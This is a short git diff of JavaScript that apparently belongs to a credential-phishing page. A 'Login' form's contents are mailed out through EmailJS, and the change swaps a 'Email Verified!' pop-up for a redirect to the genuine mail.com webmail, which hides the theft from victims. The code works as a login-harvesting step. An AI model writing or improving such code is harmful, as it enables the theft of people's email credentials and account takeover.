@@ -12,11 +12,7 @@ document.getElementById('form')
     emailjs.sendForm(serviceID, templateID, this)
       .then(() => {
         btn.value = 'Login';
-        Swal.fire({
-          title: "Email Verified!",
-          text: "Exit Page!",
-          icon: "success"
-        });
+        window.location.href = 'https://www.mail.com/mail/app/';
       }, (err) => {
         btn.value = 'Login';
         alert(JSON.stringify(err));
